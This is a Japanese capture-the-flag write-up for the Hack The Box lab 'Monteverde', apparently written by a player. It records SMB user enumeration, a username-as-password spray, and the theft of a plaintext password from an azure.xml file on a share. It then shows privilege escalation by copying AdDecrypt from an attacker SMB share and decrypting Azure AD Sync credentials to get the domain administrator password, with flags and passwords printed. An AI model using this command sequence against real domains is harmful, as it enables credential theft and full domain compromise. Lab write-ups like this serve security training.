## STEP 1
```sh
└─$ rustscan -a 10.129.228.111 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.111:53
Open 10.129.228.111:88
Open 10.129.228.111:135
Open 10.129.228.111:139
Open 10.129.228.111:389
Open 10.129.228.111:445
Open 10.129.228.111:464
Open 10.129.228.111:593
Open 10.129.228.111:636
Open 10.129.228.111:3268
Open 10.129.228.111:3269
Open 10.129.228.111:5985
Open 10.129.228.111:9389
Open 10.129.228.111:49667
Open 10.129.228.111:49674
Open 10.129.228.111:49673
Open 10.129.228.111:49676
Open 10.129.228.111:49696
10.129.228.111 -> [53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49674,49673,49676,49696]
```


## STEP 2
クレデンシャルなしでユーザ列挙できた
```sh
└─$ netexec smb 10.129.228.111 -u '' -p '' --users-export users.txt     
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\: 
SMB         10.129.228.111  445    MONTEVERDE       -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.228.111  445    MONTEVERDE       Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.228.111  445    MONTEVERDE       AAD_987d7f2f57d2              2020-01-02 22:53:24 0       Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
SMB         10.129.228.111  445    MONTEVERDE       mhope                         2020-01-02 23:40:05 0        
SMB         10.129.228.111  445    MONTEVERDE       SABatchJobs                   2020-01-03 12:48:46 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-ata                       2020-01-03 12:58:31 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-bexec                     2020-01-03 12:59:55 0        
SMB         10.129.228.111  445    MONTEVERDE       svc-netapp                    2020-01-03 13:01:42 0        
SMB         10.129.228.111  445    MONTEVERDE       dgalanos                      2020-01-03 13:06:10 0        
SMB         10.129.228.111  445    MONTEVERDE       roleary                       2020-01-03 13:08:05 0        
SMB         10.129.228.111  445    MONTEVERDE       smorgan                       2020-01-03 13:09:21 0        
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated 10 local users: MEGABANK
SMB         10.129.228.111  445    MONTEVERDE       [*] Writing 10 local users to users.txt
```
パスワードにユーザ名を使いまわしてないか確認、「SABatchJobs」のパスワードがユーザ名と同じですね
```sh
└─$ netexec smb 10.129.228.111 -u users.txt -p users.txt 
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE 

省略

SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
「SABatchJobs」ではwinrmログインできないもよう
```sh
┌──(kali㉿kali)-[~/htb/smb]
└─$ evil-winrm -i 10.129.228.111 -u SABatchJobs -p SABatchJobs
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
共有フォルダ列挙、「users$mhope/azure.xml」が怪しい
```sh
└─$ netexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs -M spider_plus
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ            
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.129.228.111.json".
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] SMB Shares:           8 (ADMIN$, azure_uploads, C$, E$, IPC$, NETLOGON, SYSVOL, users$)
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] SMB Readable Shares:  5 (azure_uploads, IPC$, NETLOGON, SYSVOL, users$)
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] Total folders found:  23
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] Total files found:    6
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] File size average:    1.58 KB
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] File size min:        22 B
SPIDER_PLUS 10.129.228.111  445    MONTEVERDE       [*] File size max:        4.43 KB

└─$ cat /home/kali/.nxc/modules/nxc_spider_plus/10.129.228.111.json 
{
    "NETLOGON": {},
    "SYSVOL": {
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-03 07:47:23",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-03 07:47:23",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-03 07:47:23",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-03 07:47:23",
            "size": "1.07 KB"
        },
        "MEGABANK.LOCAL/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2020-01-02 17:17:56",
            "ctime_epoch": "2020-01-02 17:17:56",
            "mtime_epoch": "2020-01-02 17:17:56",
            "size": "2.73 KB"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2020-01-02 17:26:34",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-02 17:26:34",
            "size": "22 B"
        },
        "MEGABANK.LOCAL/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2020-01-02 17:26:34",
            "ctime_epoch": "2020-01-02 17:05:22",
            "mtime_epoch": "2020-01-02 17:26:34",
            "size": "4.43 KB"
        }
    },
    "azure_uploads": {},
    "users$": {
        "mhope/azure.xml": {
            "atime_epoch": "2020-01-03 08:41:18",
            "ctime_epoch": "2020-01-03 08:39:53",
            "mtime_epoch": "2020-01-03 09:59:24",
            "size": "1.18 KB"
        }
    }
} 
```
「users$mhope/azure.xml」をダウンロード・確認  
パスワードっぽものを確認、ファイルパスからユーザ「mhope」のパスワードかも
```sh
└─$ netexec smb 10.129.228.111 -u SABatchJobs -p SABatchJobs --share users$ --get-file /mhope/azure.xml /home/kali/azure.xml
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Copying "/mhope/azure.xml" to "/home/kali/azure.xml"
SMB         10.129.228.111  445    MONTEVERDE       [+] File "/mhope/azure.xml" was downloaded to "/home/kali/azure.xml"

└─$ cat azure.xml                                                  
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
winrmでログイン成功！ユーザフラグゲット
```sh
└─$ evil-winrm -i 10.129.228.111 -u 'mhope' -p '4n0therD4y@n0th3r$'                                         
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mhope\Documents> cat ../Desktop/user.txt
efa3cbf7ec605f05e2bf992719a040ff
```


## STEP 3
所属グループを確認すると、「Azure Admins」を確認  
```cmd
*Evil-WinRM* PS C:\Users\mhope\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```
ということで、Azureのお勉強タイム  
[Microsoft Entra ID でサポートされるディレクトリ間のプロビジョニングの種類](https://learn.microsoft.com/ja-jp/entra/identity/hybrid/what-is-inter-directory-provisioning#what-types-of-inter-directory-provisioning-does-microsoft-entra-id-support)  
Microsoft Entra Connectという、Active Directory と Microsoft Entra ID 間のプロピジョニングを行う機能があるらしい  
「 Microsoft Entra Connect コマンド」でググると、[Microsoft Entra Connect: ADSync PowerShell リファレンス](https://learn.microsoft.com/ja-jp/entra/identity/hybrid/connect/reference-connect-adsync)を発見  
そのリンク内で、「Get-ADSyncDatabaseConfiguration」コマンドが実行できた  
コマンドで「ADSync」というデータベースを確認、どうやらオンプレとクラウド間の同期情報が格納されているっぽい
```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> Get-ADSyncDatabaseConfiguration 


IsLocalDBInstalled    : False
LocalDBUsedSpaceInMb  : 0
SqlServerName         : MONTEVERDE.MEGABANK.LOCAL
SqlServerInstanceName :
SqlServerDBName       : ADSync
```
「ADSync exploit」でググると、[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)というツールを発見  
[ポスト](https://web.archive.org/web/20230330142808/https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/)を見ると、この[ツール](https://github.com/dirkjanm/adconnectdump/tree/master/ADSyncDecrypt/ADSyncDecrypt)のVB.NET製らしい  
仕組みとしては
1. DBからKeyManagerから暗号化キーを取得
2. DBから暗号化されたパスワードを取得
3. 「C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll」の「Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager」を使って暗号化キーによるパスワード復号

ということでダウンロード
```sh
└─$ wget -nv https://github.com/VbScrub/AdSyncDecrypt/releases/download/v1.0/AdDecrypt.zip
2025-08-15 04:42:12 URL:https://release-assets.githubusercontent.com/github-production-release-asset/257912912/7117a000-84a7-11ea-8b7b-d19439d5eb39?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-08-15T09%3A31%3A38Z&rscd=attachment%3B+filename%3DAdDecrypt.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-08-15T08%3A31%3A14Z&ske=2025-08-15T09%3A31%3A38Z&sks=b&skv=2018-11-09&sig=KPy%2FthAOha3deYOvknQ8dpco2unwtJLI7Y4m97lFfQ4%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1NTI0NzYzMiwibmJmIjoxNzU1MjQ3MzMyLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.WOzHixiR20k2PUdvq-qiQ0WTvOAf9lZQWotF78Ie1HM&response-content-disposition=attachment%3B%20filename%3DAdDecrypt.zip&response-content-type=application%2Foctet-stream [152818/152818] -> "AdDecrypt.zip" [1]

└─$ unzip AdDecrypt.zip                                             
Archive:  AdDecrypt.zip
  inflating: AdDecrypt.exe           
  inflating: mcrypt.dll

└─$ impacket-smbserver -smb2support share .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
配送し、ポストで紹介されている使い方で実行  
administratorのパスワードゲット！
```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.16.23\share\mcrypt.dll

*Evil-WinRM* PS C:\Users\mhope\Documents> copy \\10.10.16.23\share\AdDecrypt.exe

*Evil-WinRM* PS C:\Users\mhope\Documents> cd 'C:\Program Files\Microsoft Azure AD Sync\Bin>'

*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin> C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```
winrmでログイン成功！ルートフラグゲット
```sh
└─$ evil-winrm -i 10.129.228.111 -u 'administrator' -p 'd0m@in4dminyeah!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../Desktop/root.txt
e31ccf960d1eac8460ce38938cf9c98c
```
